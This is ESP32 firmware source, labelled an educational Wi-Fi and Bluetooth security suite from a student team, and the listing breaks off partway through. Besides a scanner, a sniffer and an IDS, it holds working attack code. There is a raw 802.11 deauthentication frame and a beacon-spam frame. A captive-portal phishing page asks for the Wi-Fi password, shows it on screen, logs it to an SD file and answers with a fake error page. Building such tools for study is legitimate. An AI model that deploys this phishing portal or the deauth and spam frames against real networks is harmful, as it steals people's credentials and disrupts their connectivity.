/*
 * ╔══════════════════════════════════════════════════════════════╗
 * ║       CYD EDU-SEC SUITE v2.1 — EDICIÓN VISUAL MEJORADA      ║
 * ║   Herramienta Educativa de Ciberseguridad para ESP32-CYD     ║
 * ║                                                              ║
 * ║  Mejoras UI v2.1:                                            ║
 * ║  • Splash Screen animado con barra de progreso               ║
 * ║  • Botones con icono ASCII + etiqueta                        ║
 * ║  • Matrix Rain en inactividad (30 s)                         ║
 * ║  • Barra de estado con modo activo y canal Wi-Fi             ║
 * ║  • Feedback táctil con onda de expansión                     ║
 * ║                                                              ║
 * ║  AUTORES: Jairo Guillen Celi, Denis Toscano,                 ║
 * ║           Henry Chimbosina, Christian Chiluisa               ║
 * ║  TUTOR:   PhD. Marco Polo Silva                              ║
 * ║  INST.:   ISTE Ambato — 2026                                 ║
 * ╚══════════════════════════════════════════════════════════════╝
 */

// ──────────────────────────────────────────────────────────────────
// LIBRERÍAS
// ──────────────────────────────────────────────────────────────────
#include <SPI.h>
#include <TFT_eSPI.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <FS.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>

// ──────────────────────────────────────────────────────────────────
// HARDWARE
// ──────────────────────────────────────────────────────────────────
#define SD_CS_PIN 5
TFT_eSPI tft = TFT_eSPI();

// ──────────────────────────────────────────────────────────────────
// PALETA DE COLORES "TERMINAL HACKER"
// ──────────────────────────────────────────────────────────────────
#define C_BLACK      0x0000
#define C_DARKGREY   0x3186
#define C_NEON_GREEN 0x07E0
#define C_NEON_RED   0xF800
#define C_WHITE      0xFFFF
#define C_GREY       0x7BEF
#define C_YELLOW     0xFFE0
#define C_CYAN       0x03EF
#define C_ORANGE     0xFD20
#define C_MAGENTA    0xF81F
#define C_DIM_GREEN  0x0380   // verde oscuro para efectos Matrix

// ──────────────────────────────────────────────────────────────────
// MÁQUINA DE ESTADOS (FSM)
// ──────────────────────────────────────────────────────────────────
enum AppMode {
  MENU, SCANNER, SNIFFER, ATTACK_BEACON, ATTACK_PORTAL,
  ATTACK_DEAUTH, ATTACK_BLE_SPAM, APP_SYNC,
  ATTACK_EVIL_TWIN, APP_NMAP, APP_IDS
};

AppMode currentMode = MENU;
bool    sdAvailable = false;
int     currentPage = 0;

// ──────────────────────────────────────────────────────────────────
// VARIABLES TÁCTILES
// ──────────────────────────────────────────────────────────────────
uint16_t t_x = 0, t_y = 0;
bool     pressed = false;

// Calibración XPT2046 — ejecutar Touch_calibrate y reemplazar:
uint16_t calData[5] = { 264, 3361, 427, 3362, 1 };

// ──────────────────────────────────────────────────────────────────
// VARIABLES UI — inactividad y Matrix Rain
// ──────────────────────────────────────────────────────────────────
unsigned long lastStatusBarUpdate = 0;
unsigned long lastTouchTime       = 0;       // para detectar inactividad
bool          matrixActive        = false;   // ¿Matrix Rain activo?
int           matrixCols[20];               // posición Y de cada columna
int           matrixSpeeds[20];             // velocidad de cada columna
bool          matrixInited        = false;

// ──────────────────────────────────────────────────────────────────
// VARIABLES SNIFFER + PCAP
// ──────────────────────────────────────────────────────────────────
#define MAX_CHANNELS 14
int           packetCounts[MAX_CHANNELS];
int           currentChannel    = 1;
unsigned long lastChannelChange = 0;
File          pcapFile;
bool          pcapEnabled    = false;
bool          snifferFixed   = false;
int           snifferFixedCh = 6;
unsigned long lastPcapFlush  = 0;
volatile bool pcap_has_packet = false;
uint8_t  pcap_buf[256];
uint32_t pcap_len = 0, pcap_ts_sec = 0, pcap_ts_usec = 0;

// ──────────────────────────────────────────────────────────────────
// VARIABLES PORTAL / SYNC / EVIL TWIN
// ──────────────────────────────────────────────────────────────────
const byte DNS_PORT = 53;
IPAddress  apIP(192, 168, 4, 1);
DNSServer  dnsServer;
WebServer  webServer(80);
String     capturedPassword = "";
bool       portalRunning    = false;
bool       syncRunning      = false;
String     evilTwinSSID     = "Free_WiFi";

// ──────────────────────────────────────────────────────────────────
// VARIABLES BLE SPAM
// ──────────────────────────────────────────────────────────────────
BLEAdvertising *pAdvertising  = nullptr;
int             bleTarget      = 0;          // 0=Apple 1=Windows 2=Android
unsigned long   blePacketCount = 0;

// ──────────────────────────────────────────────────────────────────
// VARIABLES IDS
// ──────────────────────────────────────────────────────────────────
volatile int  idsDeauthCount = 0;
bool          idsRunning     = false;
unsigned long idsLastAlert   = 0;
unsigned long idsWindowStart = 0;

// ──────────────────────────────────────────────────────────────────
// PAQUETES RAW 802.11
// ──────────────────────────────────────────────────────────────────
const char* spamSSIDs[] = {
  "FREE_WIFI_GUEST", "FBI_SURVEILLANCE_VAN",
  "TROYANO.EXE", "SYSTEM_UPDATE_REQ", "DONT_CONNECT_HERE"
};

uint8_t beaconPacket[128] = {
  0x80,0x00,0x00,0x00, 0xff,0xff,0xff,0xff,0xff,0xff,
  0x01,0x02,0x03,0x04,0x05,0x06, 0x01,0x02,0x03,0x04,0x05,0x06,
  0xc0,0x6c, 0x83,0x51,0xf7,0x8f,0x0f,0x00,
  0x00,0x00,0x64,0x00,0x01,0x04
};

uint8_t deauthPacket[26] = {
  0xc0,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x07,0x00
};

// ──────────────────────────────────────────────────────────────────
// HTML PORTAL CAUTIVO
// ──────────────────────────────────────────────────────────────────
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{background:#111;color:#0f0;font-family:sans-serif;
       text-align:center;padding:20px;}
  input{padding:12px;width:90%;margin:10px 0;background:#000;
        border:1px solid #0f0;color:#0f0;}
  button{background:#f00;color:white;padding:15px;border:none;
         width:100%;font-size:16px;cursor:pointer;}
</style></head><body>
<h2>Security Check</h2>
<p>Firmware update required. Verify your WiFi credentials.</p>
<form action="/login" method="POST">
  <input type="password" name="pwd" placeholder="WiFi Password">
  <button type="submit">VERIFY</button>
</form></body></html>
)rawliteral";

// ──────────────────────────────────────────────────────────────────
// PROTOTIPOS
// ──────────────────────────────────────────────────────────────────
void dibujarBarraEstado();
void drawBtn(int x, int y, int w, int h, String label,
             uint16_t color, const unsigned short* icon = NULL);
void drawBtnIcon(int x, int y, int w, int h,
                 String icon, String label, uint16_t color);
void touchRipple(int cx, int cy, uint16_t color);
void splashScreen();
void matrixRainStep();
void handleSyncRoot();
void handleSyncDownload();
bool touchIn(int x, int y, int w, int h);
void resetWiFi();
void updatePortalScreen();

// ══════════════════════════════════════════════════════════════════
//  ██████╗  ██████╗  ██████╗
//  ██╔══██╗██╔════╝ ██╔════╝
//  ██████╔╝██║  ███╗██║
//  ██╔══██╗██║   ██║██║
//  ██████╔╝╚██████╔╝╚██████╗
// SETUP & LOOP
// ══════════════════════════════════════════════════════════════════
void setup() {
  Serial.begin(115200);
  tft.init();
  tft.setRotation(1);
  tft.fillScreen(C_BLACK);
  tft.setTouch(calData);

  // ── SPLASH SCREEN ─────────────────────────────────────────────
  splashScreen();

  // ── SD ────────────────────────────────────────────────────────
  if (SD.begin(SD_CS_PIN)) {
    sdAvailable = true;
    Serial.println("[SD] OK");
  }

  // ── Enrutamiento web dinámico ──────────────────────────────────
  webServer.on("/", HTTP_GET, []() {
    if (currentMode == APP_SYNC) handleSyncRoot();
    else webServer.send(200, "text/html", index_html);
  });
  webServer.onNotFound([]() {
    if (currentMode == APP_SYNC) handleSyncDownload();
    else webServer.send(200, "text/html", index_html);
  });
  webServer.on("/login", HTTP_POST, []() {
    if (webServer.hasArg("pwd")) {
      capturedPassword = webServer.arg("pwd");
      tft.fillScreen(C_BLACK);
      tft.setTextColor(C_YELLOW, C_BLACK);
      tft.setTextDatum(MC_DATUM);
      tft.setTextFont(4);
      tft.drawString("!! CREDENCIAL CAZADA !!", 160, 50);
      tft.setTextColor(C_WHITE, C_BLACK);
      tft.drawString(capturedPassword, 160, 120);
      if (sdAvailable) {
        File log = SD.open("/phish_log.txt", FILE_APPEND);
        if (log) {
          log.println("[" + String(millis()/1000) + "s] SSID:" +
                      evilTwinSSID + " | PWD:" + capturedPassword);
          log.close();
        }
      }
      webServer.send(200, "text/html",
        "<h1 style='color:red'>Error 500.</h1><p>Intente de nuevo.</p>");
    }
  });

  lastTouchTime = millis();
  drawMenu();
}

void loop() {
  pressed = tft.getTouch(&t_x, &t_y);

  // Registrar actividad táctil
  if (pressed) {
    lastTouchTime  = millis();
    if (matrixActive) {
      // Salir del Matrix Rain al tocar
      matrixActive  = false;
      matrixInited  = false;
      drawMenu();
      return;
    }
  }

  // Actualizar barra de estado en menú cada 1 s
  if (currentMode == MENU && (millis() - lastStatusBarUpdate > 1000)) {
    dibujarBarraEstado();
    lastStatusBarUpdate = millis();
  }

  // Matrix Rain si hay más de 30 s de inactividad en el menú
  if (currentMode == MENU && !matrixActive &&
      millis() - lastTouchTime > 30000) {
    matrixActive = true;
  }
  if (matrixActive) {
    matrixRainStep();
    return;
  }

  // ── FSM ───────────────────────────────────────────────────────
  switch (currentMode) {
    case MENU:           handleMenuTouch(); break;
    case SCANNER:
      if (pressed && touchIn(10,200,100,35))  drawMenu();
      if (pressed && touchIn(120,200,190,35)) saveScanToSD();
      break;
    case SNIFFER:        updateSniffer(); break;
    case ATTACK_BEACON:  runBeaconSpam(); break;
    case ATTACK_PORTAL:
    case ATTACK_EVIL_TWIN:
      if (portalRunning) {
        dnsServer.processNextRequest();
        webServer.handleClient();
        updatePortalScreen();
        if (pressed && t_y > 200) stopPortal();
      }
      break;
    case ATTACK_DEAUTH:   runDeauth();    break;
    case ATTACK_BLE_SPAM: runBLESpam();  break;
    case APP_SYNC:
      if (syncRunning) {
        webServer.handleClient();
        if (pressed && t_y > 200) stopSync();
      }
      break;
    case APP_NMAP: runNmap(); break;
    case APP_IDS:  updateIDS(); break;
  }
}

// ══════════════════════════════════════════════════════════════════
// UI MEJORADA
// ══════════════════════════════════════════════════════════════════

// ── 1. SPLASH SCREEN ──────────────────────────────────────────────
void splashScreen() {
  tft.fillScreen(C_BLACK);

  // Marco exterior decorativo
  tft.drawRoundRect(5, 5, 310, 230, 10, C_DARKGREY);
  tft.drawRoundRect(7, 7, 306, 226, 9,  C_DIM_GREEN);

  // Título principal
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(C_NEON_GREEN, C_BLACK);
  tft.setTextFont(4);
  tft.drawString("CYD EDU-SEC", 160, 55);

  // Versión
  tft.setTextFont(2);
  tft.setTextColor(C_CYAN, C_BLACK);
  tft.drawString("Suite v2.1 — UI Edition", 160, 85);

  // Línea separadora
  tft.drawFastHLine(30, 100, 260, C_DARKGREY);

  // Institución
  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.setTextFont(1);
  tft.drawString("ISTE Ambato  |  2026", 160, 112);

  // Autores
  tft.setTextColor(C_GREY, C_BLACK);
  tft.drawString("Guillen  Toscano  Chimbosina  Chiluisa", 160, 125);

  // Línea separadora
  tft.drawFastHLine(30, 140, 260, C_DARKGREY);

  // Iniciando módulos con efecto typewriter
  tft.setTextColor(C_NEON_GREEN, C_BLACK);
  tft.setTextDatum(TL_DATUM);

  const char* modules[] = {
    "> WiFi Scanner...", "> Sniffer PCAP...", "> BLE Spam...",
    "> IDS Blue Team..."
  };
  for (int m = 0; m < 4; m++) {
    String line = modules[m];
    int xPos = 35;
    int yPos = 152 + m * 13;
    for (int c = 0; c < (int)line.length(); c++) {
      tft.drawChar(xPos + c * 6, yPos, line[c], C_NEON_GREEN, C_BLACK, 1);
      delay(18);
    }
    // "OK" al final en cyan
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.drawString(" OK", xPos + line.length() * 6, yPos);
    tft.setTextColor(C_NEON_GREEN, C_BLACK);
  }

  // Barra de progreso animada
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.setTextFont(1);
  tft.drawString("Iniciando...", 160, 214);
  tft.drawRect(20, 222, 280, 8, C_DARKGREY);
  for (int i = 0; i <= 280; i += 5) {
    tft.fillRect(21, 223, i, 6, C_NEON_GREEN);
    delay(10);
  }
  delay(400);
}

// ── 2. MATRIX RAIN ────────────────────────────────────────────────
// Caracteres usados para la lluvia
const char matrixChars[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                            "!@#$%&*<>?/\\|[]{}^~";

void matrixRainStep() {
  // Inicializar columnas la primera vez
  if (!matrixInited) {
    tft.fillScreen(C_BLACK);
    for (int i = 0; i < 20; i++) {
      matrixCols[i]   = random(0, 240);
      matrixSpeeds[i] = random(2, 8);
    }
    matrixInited = true;
    // Texto superpuesto semitransparente
    tft.setTextColor(C_DIM_GREEN, C_BLACK);
    tft.setTextDatum(MC_DATUM);
    tft.setTextFont(2);
    tft.drawString("[ TOCA PARA DESPERTAR ]", 160, 120);
  }

  for (int i = 0; i < 20; i++) {
    int x = i * 16 + 4;

    // Carácter brillante (cabeza de la gota)
    char ch = matrixChars[random(0, sizeof(matrixChars) - 1)];
    tft.setTextFont(2);
    tft.drawChar(x, matrixCols[i], ch, C_NEON_GREEN, C_BLACK, 1);

    // "Cola" más oscura 10 px arriba
    tft.drawChar(x, matrixCols[i] - 10, ch, C_DIM_GREEN, C_BLACK, 1);

    // Borrar 24 px arriba (rastro que desaparece)
    tft.fillRect(x, matrixCols[i] - 24, 12, 12, C_BLACK);

    // Avanzar columna
    matrixCols[i] += matrixSpeeds[i];
    if (matrixCols[i] > 240) {
      matrixCols[i]   = random(-40, 0); // reiniciar desde arriba con offset
      matrixSpeeds[i] = random(2, 8);
    }
  }

  // Redibujar el texto central periódicamente para que no lo borre la lluvia
  static unsigned long lastRedraw = 0;
  if (millis() - lastRedraw > 3000) {
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setTextDatum(MC_DATUM);
    tft.setTextFont(2);
    tft.drawString("[ TOCA PARA DESPERTAR ]", 160, 120);
    lastRedraw = millis();
  }

  delay(40);
}

// ── 3. BARRA DE ESTADO MEJORADA ───────────────────────────────────
void dibujarBarraEstado() {
  tft.fillRect(0, 0, 320, 20, C_BLACK);
  tft.drawFastHLine(0, 20, 320, C_DARKGREY);

  // Uptime
  unsigned long s = millis() / 1000;
  char tStr[10];
  sprintf(tStr, "%02d:%02d", (s % 3600) / 60, s % 60);
  tft.setTextFont(1);
  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.drawString(tStr, 5, 5);

  // Modo activo con color semántico
  tft.setTextDatum(MC_DATUM);
  String  modeStr;
  uint16_t modeCol;
  switch (currentMode) {
    case SCANNER:          modeStr = "[SCAN]";   modeCol = C_NEON_GREEN; break;
    case SNIFFER:          modeStr = "[SNIFF]";  modeCol = C_CYAN;       break;
    case ATTACK_BEACON:    modeStr = "[SPAM]";   modeCol = C_NEON_RED;   break;
    case ATTACK_PORTAL:    modeStr = "[PHISH]";  modeCol = C_NEON_RED;   break;
    case ATTACK_DEAUTH:    modeStr = "[DEAUTH]"; modeCol = C_NEON_RED;   break;
    case ATTACK_BLE_SPAM:  modeStr = "[BLE]";    modeCol = C_MAGENTA;    break;
    case APP_SYNC:         modeStr = "[SYNC]";   modeCol = C_NEON_GREEN; break;
    case ATTACK_EVIL_TWIN: modeStr = "[EVIL]";   modeCol = C_NEON_RED;   break;
    case APP_NMAP:         modeStr = "[NMAP]";   modeCol = C_NEON_GREEN; break;
    case APP_IDS:          modeStr = "[IDS]";    modeCol = C_CYAN;       break;
    default:               modeStr = "[MENU]";   modeCol = C_DARKGREY;   break;
  }
  tft.setTextColor(modeCol, C_BLACK);
  tft.drawString(modeStr, 160, 5);

  // Canal Wi-Fi activo (derecha)
  tft.setTextDatum(TR_DATUM);
  tft.setTextColor(sdAvailable ? C_NEON_GREEN : C_NEON_RED, C_BLACK);
  String right = String(sdAvailable ? "SD " : "-- ") + "CH:" + String(currentChannel);
  tft.drawString(right, 315, 5);
}

// ── 4. BOTÓN CON ICONO ASCII + ETIQUETA ───────────────────────────
// icon  = símbolo grande (font 4, ~16px)
// label = texto pequeño debajo (font 1)
void drawBtnIcon(int x, int y, int w, int h,
                 String icon, String label, uint16_t color) {
  tft.fillRect(x, y, w, h, C_BLACK);
  // Doble borde para efecto de profundidad
  tft.drawRoundRect(x,   y,   w,   h,   8, color);
  tft.drawRoundRect(x+1, y+1, w-2, h-2, 8,
    (color == C_NEON_GREEN) ? C_DIM_GREEN :
    (color == C_NEON_RED)   ? 0x7800      :
    (color == C_CYAN)        ? 0x0198      : C_DARKGREY);

  tft.setTextColor(color, C_BLACK);
  tft.setTextDatum(MC_DATUM);

  // Icono en font 4 (grande), centrado en la mitad superior del botón
  tft.setTextFont(4);
  tft.drawString(icon, x + (w / 2), y + (h / 2) - 8);

  // Etiqueta en font 1 (pequeña), en la franja inferior
  tft.setTextFont(1);
  tft.drawString(label, x + (w / 2), y + h - 9);
}

// Sobrecarga para botones de solo texto (compatibilidad con código existente)
void drawBtn(int x, int y, int w, int h, String label,
             uint16_t color, const unsigned short* icon) {
  tft.fillRect(x, y, w, h, C_BLACK);
  tft.drawRoundRect(x,   y,   w,   h,   8, color);
  tft.drawRoundRect(x+1, y+1, w-2, h-2, 8, C_DARKGREY);
  tft.setTextColor(color, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.drawString(label, x + (w / 2), y + (h / 2));
}

// ── 5. FEEDBACK TÁCTIL: ONDA DE EXPANSIÓN ─────────────────────────
void touchRipple(int cx, int cy, uint16_t color) {
  for (int r = 4; r <= 28; r += 6) {
    tft.drawCircle(cx, cy, r, color);
    delay(18);
    tft.drawCircle(cx, cy, r, C_BLACK);  // borrar para no dejar rastro
  }
}

// ── MENÚ PRINCIPAL ────────────────────────────────────────────────
void drawMenu() {
  resetWiFi();
  currentMode  = MENU;
  matrixActive = false;
  matrixInited = false;

  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();

  // Título
  tft.setTextColor(C_NEON_GREEN, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.drawString("CYD EDU-SEC v2.1", 160, 40);

  if (currentPage == 0) {
    // ── Página 1: Herramientas base ────────────────────────────
    //  Iconos: radar = ((o))  calavera = [X]  ojo = (*)
    drawBtnIcon(15,  70, 85, 65, "((o))", "SCAN",   C_NEON_GREEN);
    drawBtnIcon(117, 70, 85, 65, ">>>",   "SNIFF",  C_NEON_GREEN);
    drawBtnIcon(220, 70, 85, 65, "!!!",   "SPAM",   C_NEON_RED);
    drawBtnIcon(15, 145, 85, 65, "><>",   "PHISH",  C_NEON_RED);
    drawBtnIcon(117,145, 85, 65, "[X]",   "DEAUTH", C_NEON_RED);
    drawBtnIcon(220,145, 85, 65, ">>",    "> MAS",  C_GREY);
  } else {
    // ── Página 2: Herramientas avanzadas ──────────────────────
    drawBtnIcon(15,  70, 85, 65, "<<",    "VOLVER", C_GREY);
    drawBtnIcon(117, 70, 85, 65, "*BT*",  "BLE",    C_NEON_RED);
    drawBtnIcon(220, 70, 85, 65,
      sdAvailable ? "[SD]" : "[--]",
      sdAvailable ? "SYNC" : "NO SD",
      sdAvailable ? C_NEON_GREEN : C_DARKGREY);
    drawBtnIcon(15, 145, 85, 65, "((X))", "EVIL AP",C_NEON_RED);
    drawBtnIcon(117,145, 85, 65, "[-]",   "NMAP",   C_NEON_GREEN);
    drawBtnIcon(220,145, 85, 65, "[S]",   "IDS",    C_CYAN);
  }
}

// ── MANEJO DE TOQUE EN MENÚ ───────────────────────────────────────
void handleMenuTouch() {
  if (!pressed) return;
  delay(80);

  if (currentPage == 0) {
    if (touchIn(15,  70, 85, 65)) {
      touchRipple(57,  102, C_NEON_GREEN); startScanner();
    } else if (touchIn(117, 70, 85, 65)) {
      touchRipple(159, 102, C_NEON_GREEN); startSniffer();
    } else if (touchIn(220, 70, 85, 65)) {
      touchRipple(262, 102, C_NEON_RED);   startBeaconSpam();
    } else if (touchIn(15, 145, 85, 65)) {
      touchRipple(57,  177, C_NEON_RED);   startPortal();
    } else if (touchIn(117,145, 85, 65)) {
      touchRipple(159, 177, C_NEON_RED);   startDeauth();
    } else if (touchIn(220,145, 85, 65)) {
      touchRipple(262, 177, C_GREY);
      currentPage = 1; drawMenu();
    }
  } else {
    if (touchIn(15,  70, 85, 65)) {
      touchRipple(57,  102, C_GREY);
      currentPage = 0; drawMenu();
    } else if (touchIn(117, 70, 85, 65)) {
      touchRipple(159, 102, C_NEON_RED);   startBLESpam();
    } else if (sdAvailable && touchIn(220, 70, 85, 65)) {
      touchRipple(262, 102, C_NEON_GREEN); startSync();
    } else if (touchIn(15, 145, 85, 65)) {
      touchRipple(57,  177, C_NEON_RED);   startEvilTwin();
    } else if (touchIn(117,145, 85, 65)) {
      touchRipple(159, 177, C_NEON_GREEN); startNmap();
    } else if (touchIn(220,145, 85, 65)) {
      touchRipple(262, 177, C_CYAN);       startIDS();
    }
  }
}

// ══════════════════════════════════════════════════════════════════
// MÓDULO 1: WiFi SCANNER
// ══════════════════════════════════════════════════════════════════
void startScanner() {
  currentMode = SCANNER;
  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextColor(C_NEON_GREEN, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);

  // Animación de puntos durante el escaneo
  for (int d = 0; d < 3; d++) {
    String dots = "ESCANEANDO";
    for (int i = 0; i <= d; i++) dots += ".";
    tft.fillRect(0, 100, 320, 40, C_BLACK);
    tft.drawString(dots, 160, 120);
    delay(350);
  }

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  int n = WiFi.scanNetworks();

  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextDatum(TL_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_CYAN, C_BLACK);
  tft.drawString("REDES DETECTADAS: " + String(n), 10, 25);
  tft.drawFastHLine(10, 35, 300, C_DARKGREY);

  for (int i = 0; i < ((n > 6) ? 6 : n); ++i) {
    int y = 42 + (i * 24);
    uint16_t col;
    String encTag;
    switch (WiFi.encryptionType(i)) {
      case WIFI_AUTH_OPEN: col = C_YELLOW;    encTag = "OPEN"; break;
      case WIFI_AUTH_WEP:  col = C_NEON_RED;  encTag = "WEP";  break;
      default:             col = C_NEON_GREEN; encTag = "WPA";  break;
    }
    // SSID
    tft.setTextColor(col, C_BLACK);
    tft.drawString(WiFi.SSID(i).substring(0, 14), 12, y);
    // RSSI y cifrado alineados a la derecha
    tft.setTextColor(C_DARKGREY, C_BLACK);
    tft.setTextDatum(TR_DATUM);
    tft.drawString(String(WiFi.RSSI(i)) + "dB  " + encTag, 308, y);
    tft.setTextDatum(TL_DATUM);
    // Línea divisoria sutil
    tft.drawFastHLine(12, y + 18, 296, 0x18C3);
  }

  drawBtn(10,  200, 100, 35, "MENU",      C_GREY);
  if (sdAvailable)
    drawBtn(120, 200, 190, 35, "GUARDAR SD", C_CYAN);
}

void saveScanToSD() {
  if (!sdAvailable) return;
  tft.fillRect(120, 200, 190, 35, C_YELLOW);
  tft.setTextColor(C_BLACK, C_YELLOW);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.drawString("GUARDANDO...", 215, 217);

  File f = SD.open("/scan.csv", FILE_APPEND);
  if (f) {
    if (f.size() == 0)
      f.println("SSID,BSSID,RSSI,CANAL,CIFRADO");
    int n = WiFi.scanComplete();
    for (int i = 0; i < n; i++) {
      String enc;
      switch (WiFi.encryptionType(i)) {
        case WIFI_AUTH_OPEN:         enc = "OPEN";     break;
        case WIFI_AUTH_WEP:          enc = "WEP";      break;
        case WIFI_AUTH_WPA_PSK:      enc = "WPA";      break;
        case WIFI_AUTH_WPA2_PSK:     enc = "WPA2";     break;
        case WIFI_AUTH_WPA_WPA2_PSK: enc = "WPA/WPA2"; break;
        default:                     enc = "WPA3";     break;
      }
      f.println(WiFi.SSID(i) + "," + WiFi.BSSIDstr(i) + "," +
                String(WiFi.RSSI(i)) + "," +
                String(WiFi.channel(i)) + "," + enc);
    }
    f.close();
    tft.fillRect(120, 200, 190, 35, C_NEON_GREEN);
    tft.setTextColor(C_BLACK, C_NEON_GREEN);
    tft.drawString("GUARDADO OK!", 215, 217);
  } else {
    tft.fillRect(120, 200, 190, 35, C_NEON_RED);
    tft.setTextColor(C_WHITE, C_NEON_RED);
    tft.drawString("ERROR SD", 215, 217);
  }
  delay(1200);
  startScanner();
}

// ══════════════════════════════════════════════════════════════════
// MÓDULO 2: TRAFFIC SNIFFER + PCAP
// ══════════════════════════════════════════════════════════════════
void writePcapGlobalHeader() {
  uint32_t magic = 0xa1b2c3d4; pcapFile.write((uint8_t*)&magic, 4);
  uint16_t vmaj  = 2;          pcapFile.write((uint8_t*)&vmaj, 2);
  uint16_t vmin  = 4;          pcapFile.write((uint8_t*)&vmin, 2);
  int32_t  tz    = 0;          pcapFile.write((uint8_t*)&tz, 4);
  uint32_t sig   = 0;          pcapFile.write((uint8_t*)&sig, 4);
  uint32_t snap  = 65535;      pcapFile.write((uint8_t*)&snap, 4);
  uint32_t net   = 105;        pcapFile.write((uint8_t*)&net, 4);
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (currentChannel >= 1 && currentChannel <= 13)
    packetCounts[currentChannel]++;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if (pkt->payload[0] == 0xC0) idsDeauthCount++;  // Deauth frame
  if (pcapEnabled && !pcap_has_packet) {
    pcap_len = pkt->rx_ctrl.sig_len;
    uint32_t cl = (pcap_len > 256) ? 256 : pcap_len;
    memcpy(pcap_buf, pkt->payload, cl);
    pcap_ts_sec  = millis() / 1000;
    pcap_ts_usec = (millis() % 1000) * 1000;
    pcap_has_packet = true;
  }
}

void startSniffer() {
  currentMode     = SNIFFER;
  pcapEnabled     = false;
  pcap_has_packet = false;
  snifferFixed    = false;

  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextColor(C_WHITE, C_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextFont(4);
  tft.drawString("TRAFFIC MONITOR", 10, 25);
  tft.setTextFont(1);
  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.drawString("Canal 1-13 | Channel Hopping 150ms", 10, 50);
  tft.drawFastHLine(10, 180, 300, C_DARKGREY);

  drawBtn(220, 200,  90, 35, "STOP",     C_NEON_RED);
  if (sdAvailable)
    drawBtn(10,  200, 100, 35, "PCAP:OFF", C_GREY);
  drawBtn(115, 200, 100, 35, "CH:AUTO",  C_CYAN);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
}

void updateSniffer() {
  if (pcapEnabled && pcap_has_packet) {
    uint32_t cl = (pcap_len > 256) ? 256 : pcap_len;
    pcapFile.write((uint8_t*)&pcap_ts_sec,  4);
    pcapFile.write((uint8_t*)&pcap_ts_usec, 4);
    pcapFile.write((uint8_t*)&cl,           4);
    pcapFile.write((uint8_t*)&pcap_len,     4);
    pcapFile.write(pcap_buf, cl);
    pcap_has_packet = false;
    if (millis() - lastPcapFlush > 2000) { pcapFile.flush(); lastPcapFlush = millis(); }
  }

  if (pressed && touchIn(220, 200, 90, 35)) { stopSniffer(); return; }

  if (sdAvailable && pressed && touchIn(10, 200, 100, 35)) {
    delay(200);
    pcapEnabled = !pcapEnabled;
    if (pcapEnabled) {
      String fname = "/cap_" + String(millis() / 1000) + ".pcap";
      pcapFile = SD.open(fname, FILE_WRITE);
      if (pcapFile) writePcapGlobalHeader();
      drawBtn(10, 200, 100, 35, "PCAP:ON", C_NEON_GREEN);
    } else {
      pcapFile.close();
      drawBtn(10, 200, 100, 35, "PCAP:OFF", C_GREY);
    }
  }

  if (pressed && touchIn(115, 200, 100, 35)) {
    delay(200);
    snifferFixed = !snifferFixed;
    if (snifferFixed) {
      snifferFixedCh = currentChannel;
      esp_wifi_set_channel(snifferFixedCh, WIFI_SECOND_CHAN_NONE);
      drawBtn(115, 200, 100, 35, "CH:" + String(snifferFixedCh), C_ORANGE);
    } else {
      drawBtn(115, 200, 100, 35, "CH:AUTO", C_CYAN);
    }
  }

  if (!snifferFixed && millis() - lastChannelChange > 150) {
    int h = (packetCounts[currentChannel] > 140) ? 140 : packetCounts[currentChannel];
    int x = 20 + (currentChannel * 20);
    tft.fillRect(x, 55, 15, 125, C_BLACK);
    // Gradiente de color según saturación
    uint16_t barCol = (h > 100) ? C_NEON_RED :
                      (h > 50)  ? C_ORANGE   : C_NEON_GREEN;
    tft.fillRect(x, 180 - h, 15, h, barCol);
    tft.setTextFont(1);
    tft.setTextColor(C_DARKGREY, C_BLACK);
    tft.drawNumber(currentChannel, x + 2, 183);
    packetCounts[currentChannel] = 0;
    currentChannel++;
    if (currentChannel > 13) currentChannel = 1;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    lastChannelChange = millis();
    dibujarBarraEstado();  // actualizar CH en barra
  }
}

void stopSniffer() {
  esp_wifi_set_promiscuous(false);
  if (pcapEnabled) pcapFile.close();
  drawMenu();
}

// ══════════════════════════════════════════════════════════════════
// MÓDULO 3: BEACON SPAMMER
// ══════════════════════════════════════════════════════════════════
void startBeaconSpam() {
  currentMode = ATTACK_BEACON;
  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextColor(C_NEON_RED, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.drawString("BEACON ATTACK", 160, 65);
